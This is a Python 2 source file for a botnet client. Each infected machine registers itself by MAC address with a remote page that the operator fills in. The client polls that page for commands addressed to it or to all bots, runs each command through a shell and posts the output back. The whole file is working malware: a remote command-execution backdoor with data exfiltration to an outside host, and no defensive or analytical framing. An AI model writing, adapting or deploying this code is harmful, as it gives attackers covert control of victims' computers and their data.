from uuid import getnode as get_mac
import urllib
import urllib2
import wget
import threading
import subprocess
import os
from time import sleep

MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
PAGE = "" #Coloque a pagina gerada aqui.

class CommandToExecute:
    
    def hello(self):
        page = PAGE+"/"+MAC_ADDRESS
        s = SendMessage(MAC_ADDRESS,page)
        s.send()
        
    def getMac(self):
        return MAC_ADDRESS
    
    def getCommand(self):
        output_page = PAGE+"/"+MAC_ADDRESS+"/cmd.txt"
        output_page = urllib2.urlopen(output_page).read()
        return output_page
    
    def getCommandForAll(self):
        output_page = PAGE+"/ALL/cmd.txt"
        filename = wget.download(output_page)
        with open(filename) as f:
            lines = f.read().splitlines()
        f.close()
        os.remove(filename)
        if lines == []:
            return ""
        else:
            return lines[0]
    
    def setBot(self):
        bots_page = PAGE+"/bots.txt"
        data = urllib2.urlopen(bots_page).read()
        data = data.split("\n")
        
        for l in data:
            if l==MAC_ADDRESS:
                return None
        data = data+[MAC_ADDRESS]
        bots = '\n'.join(data)
        s = SendMessage(bots,bots_page)
        s.send()
        return None
        
        
        
class ExecuteCommand(threading.Thread):
    
    def __init__(self,comando):
        self.comando = comando
    
    def run(self):
        if self.comando == 'REFRESH':
            c = CommandToExecute()
            c.setBot()
        elif self.comando == '':
            pass
        else:
            try:
                output = subprocess.check_output(self.comando, shell=True, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
                page = PAGE+"/"+MAC_ADDRESS+"/result"
                s = SendMessage(output,page)
                s.send()
                
            except Exception as e:
                print e
                pass
            
class SendMessage:
    
    def __init__(self,mensagem,pagina):
        self.mensagem = mensagem
        self.pagina = pagina
        
    def create_message(self):
        m = { 'text' : self.mensagem }
        return m
        
    def send(self):
        site = self.pagina
        message = self.create_message()
        
        data = urllib.urlencode(message)
        
        request = urllib2.Request(site,data)
        
        request.add_header("Origin","http://")
        request.add_header("Accept-Encoding","gzip,deflate")
        request.add_header("Accept-Language","pt-BR,pt;q=0.8,en-US;q=0.6,en;q=0.4")
        request.add_header("User-Agent","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36")
        request.add_header("Content-Type","application/x-www-form-urlencoded;charset=UTF-8")
        request.add_header("X-Requested-With","XMLHttpRequest")
        request.add_header("Referer",site)
        request.add_header("Accept","application/json, text/javascript, */*; q=0.01")
        request.add_header("Connection","keep-alive")
        
        urllib2.urlopen(request)


def main():
    
    c = CommandToExecute()
    c.hello()
    c.setBot()
    
    while True:
        ce = CommandToExecute()
        cmd = ce.getCommand()
        cmd_all = ce.getCommandForAll()
        e = ExecuteCommand(cmd)
        clear_page = PAGE+"/"+MAC_ADDRESS+"/cmd"
        c = SendMessage("",clear_page)
        c.send()
        e.run()
        sleep(3)
        e = ExecuteCommand(cmd_all)
        e.run()
if __name__ == '__main__':
    main()
